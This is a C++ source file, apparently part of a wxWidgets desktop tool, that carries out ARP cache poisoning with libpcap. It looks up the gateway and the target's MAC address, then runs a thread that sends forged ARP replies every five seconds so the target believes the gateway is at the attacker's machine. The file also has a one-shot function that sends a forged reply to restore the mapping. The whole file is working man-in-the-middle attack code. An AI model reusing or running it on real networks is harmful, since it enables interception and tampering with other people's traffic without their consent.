#include "arp.h"

// sends ARP packets until canceled
wxThread::ExitCode ArpThread::Entry() {
    // die if we can't open interface...
    pcap_t *adhandle;
    if ( (adhandle= pcap_open_live(interf->name, 65536,  0, 1000, NULL ) ) == NULL)
        return  (wxThread::ExitCode)-1;

    // keep sending the packet, while send is true
    do {
        sendArp(adhandle);
        Sleep(5000);
    } while (*send);
    //then clean up and end the thread
    pcap_close(adhandle);
    return 0;
}

//sends an arp to the ip in the ip box saying that the gateway is at macSrc
void ArpThread::sendTargetedArp(wxString ipstr, pcap_if_t* interf, wxTextCtrl* output, const char* macSrc){
        // Get the gateway IP
    bool send = false;
    try{
        wxString routerIP = SystemInterface::getGateway(interf);
        u_int routerIpAddr = inet_addr(routerIP.ToAscii());
        if (routerIpAddr == (u_int) (-1)) {
            * output << _T("\nGateway not found!\n") << routerIP << _T("\n");
            return;
        }
        * output << _T("\nGateway found at ") << routerIP << _T("   ");

        //So you can get the gateway mac
        u_char srcMac[MACSIZE];
        if (macSrc == NULL)
            *output << SystemInterface::getTargetMac((u_char*) (&routerIpAddr), interf, srcMac) << _T("\n");
        else
            memcpy(srcMac, macSrc, 6);

        //get target Ip and MAC
        u_char dstMac[MACSIZE];
        u_int dstIpAddr;
        if (ipstr.Len() > 0) { //If an IP was targeted
            dstIpAddr = inet_addr(ipstr.ToAscii());
            if (inet_addr(ipstr.ToAscii()) == 0xFFFFFFFF) {
                * output << _T("ERROR, PICK A VALID IP!\n");
                return;
            }
            wxString targetMac = SystemInterface::getTargetMac((u_char*) (&dstIpAddr), interf, dstMac);
            * output << _T("target MAC found to be ") << targetMac << _T("\n");
        } else { // Restore all!
            * output << _T("valid ip not given  - restoring all\n");
            memset(&dstMac, 0xFF, MACSIZE);
            memset(&dstIpAddr, 0x00, IPSIZE);
        }

        //send the arp
        pcap_t *adhandle;
        ArpThread* athread = new ArpThread();
        if(athread->Create(&send, interf, srcMac, dstMac, (u_char *) & routerIpAddr, (u_char *) & dstIpAddr) == wxTHREAD_NO_ERROR
                && (adhandle = pcap_open_live(interf->name, 65536, 0, 1000, NULL)) != NULL) {
            athread->sendArp(adhandle); // don't actually run thread, just send once
        }else {
            * output << _T("\nerror trying to open interface.\n");
        }
        delete athread;
    }catch(const wxChar * message){ //just exit on error
        * output << _T("error: ") << message << _T("\n");
    }
}

// get router ip, local mac, target ip, and target mac to start apr attack
ArpThread * ArpThread::startAprThread(wxString ipstr, pcap_if_t* interf, wxTextCtrl* output, bool * send){
    //router ip (gateway)
    wxString routerIP = SystemInterface::getGateway(interf);
    u_int routerIpAddr = inet_addr(routerIP.ToAscii());
    if (routerIpAddr == (u_int) (-1)) 
        throw  _T("\ngateway not found!\n");
    * output << _T("\ngateway found at ") << routerIP << _T("\n");

    //local MAC
    u_char macAddr[MACSIZE];
    wxString macAddrStr = SystemInterface::getLocalMac(macAddr);
    * output << _T("local MAC found to be ") << macAddrStr << _T("\n");

    //target IP
    u_int dstIpAddr = inet_addr(ipstr.ToAscii());
    if (dstIpAddr == (u_int) (-1)) 
        throw _T("ERROR, PICK A VALID IP!\n");

    //target MAC
    u_char dstMac[MACSIZE];
    u_char localIp[4];
    SystemInterface::getLocalIp(interf, localIp);
	wxString targetMac = SystemInterface::getTargetMac(macAddr, localIp, (u_char*) (&dstIpAddr), interf, dstMac);
    * output << _T("target MAC found to be ") << targetMac << _T("\n");

    //run APR
    ArpThread * aprProcess = new ArpThread();
    if(aprProcess->Create(send, interf, macAddr, dstMac,
            (u_char*) & routerIpAddr, (u_char*) & dstIpAddr) == wxTHREAD_NO_ERROR){
        aprProcess->Run();
        return aprProcess;
    }else{
        delete aprProcess;
        throw _T("Error: thread creation failed.\n");
    }
}
